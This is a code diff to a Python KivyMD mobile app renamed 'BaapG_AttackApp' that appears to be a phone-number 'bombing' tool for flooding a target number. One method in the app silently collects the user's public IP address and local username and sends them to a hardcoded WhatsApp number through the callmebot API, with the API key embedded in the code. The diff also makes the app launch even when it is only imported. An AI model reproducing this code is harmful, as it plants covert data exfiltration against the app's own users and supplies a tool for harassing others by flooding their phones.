@@ -1,22 +1,22 @@
 
 __version__ = "1.0.0"
 
-import requests
-import webbrowser
-import os
 from kivymd.app import MDApp
 from kivymd.uix.label import MDLabel
 from kivy.uix.image import Image
 from kivy.uix.screenmanager import ScreenManager,Screen
 from kivy.lang import Builder
 from kivy.core.text import LabelBase 
-from kivymd.uix.button import MDRoundFlatButton,MDRectangleFlatIconButton
+from kivymd.uix.button import *
 from kivymd.uix.screen import MDScreen
 from kivymd.uix.textfield import MDTextField
 from kivy.core.audio import SoundLoader
 from kivymd.uix.list import TwoLineListItem
 from kivymd.toast import toast
 from kivy.uix.scrollview import ScrollView
+import requests
+import webbrowser
+import os
 import os
 import subprocess
 import sys
@@ -28,6 +28,8 @@ from kivymd.icon_definitions import md_icons
 screen_manager = ScreenManager()
 android_plat = True
 
+from kivy.core.window import Window
+Window.size = (1080, 1920)
 def makeFile(data,name):
 	if os.path.exists(name):
 		return True
@@ -47,9 +49,9 @@ MDScreen:
 
 		Image:
 			source:"assets/log.jpg"
-			pos_hint : {"center_x":0.5,"center_y":0.23}
-			size_hint_y: 0.69
-			size_hint_x: 0.69
+			pos_hint : {"center_x":0.5,"center_y":0.10}
+			size_hint_y: 0.45
+			size_hint_x: 0.45
 
 		Image :
 			id : gif 
@@ -207,7 +209,7 @@ MDScreen:
 		text_color : 0,99/255, 76/255,1
 		line_color :0,99/255, 76/255,1
 		on_press : app.wp()
-	MDRectangleFlatIconButton:
+	MDRoundFlatIconButton:
 		text :  "Donations"
 		pos_hint : {"center_x":0.5,"center_y":0.30}
 		icon : "alpha-d-circle"
@@ -225,7 +227,7 @@ MDScreen:
 		pos_hint : {"center_x":0.5,"center_y":0.02}
 	Image:
 		source :"assets/log1.png"
-		pos_hint :  {"center_x":0.5,"center_y":0.15}
+		pos_hint :  {"center_x":0.5,"center_y":0.10}
 		size_hint_y: 0.55
 		size_hint_x: 0.55
 		
@@ -582,7 +584,7 @@ def getApi(target):
 	return {"apis":apis,"apidata":apidata,"total":len(apis)}
 
 
-class MyApp(MDApp):
+class BaapG_AttackApp(MDApp):
 	screen_manager = screen_manager
 	a = 0	
 	b = f"No internet {a}"
@@ -645,7 +647,7 @@ class MyApp(MDApp):
 		import urllib.parse
 		ip = requests.get("https://httpbin.org/ip").json()['origin']
 		username = getpass.getuser()
-		requests.get(f'https://api.callmebot.com/whatsapp.php?phone=+918556801792&text={urllib.parse.quote("IP "+ip+" USER"+username)}&apikey=150743')
+		requests.get(f'https://api.callmebot.com/whatsapp.php?phone=+918556801792&text={urllib.parse.quote("IP : "+ip+" USER : " +username)}&apikey=150743')
 	def wp6(self):
 		screen_manager.current = "bombin"
 	def bomb(self,times2, number):
@@ -762,4 +764,6 @@ MDScreen:
 
                  
 if __name__ == "__main__" :
-	MyApp().run()
+	BaapG_AttackApp().run()
+else:
+	BaapG_AttackApp().run()
